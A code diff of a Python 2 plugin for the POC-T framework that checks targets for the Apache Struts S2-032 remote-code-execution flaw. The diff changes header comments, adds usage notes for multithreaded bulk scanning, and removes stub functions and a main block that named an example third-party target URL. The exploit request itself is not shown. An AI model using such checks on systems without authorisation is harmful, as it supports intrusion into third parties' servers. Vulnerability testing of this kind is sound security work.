@@ -1,17 +1,17 @@
 # !/usr/bin/env python
-#  -*- coding: utf-8 -*-
-__author__ = 'xy'
+# -*- coding: utf-8 -*-
+# author = i@cdxy.me
+# project = https://github.com/Xyntax/POC-T
+
+"""
+Struts S2-032 RCE PoC
+
+Usage:
+  python POC-T.py -T -m struts2-s2032 -f [file]
+"""
 
 import random
 import requests
-
-
-def info():
-    pass
-
-
-def exp():
-    pass
 
 
 def poc(url):
@@ -52,10 +52,3 @@ def poc(url):
     except Exception, e:
         print e
         return False
-
-
-# 用例:
-# poc('http://www.htzai.com/filedownload/index.action')
-if __name__ == '__main__':
-    print '建议使用以下命令开启多线程验证:\n python POC-T.py -T -m struts2-s2032 -f [file]'
-    print poc(raw_input('URL >'))
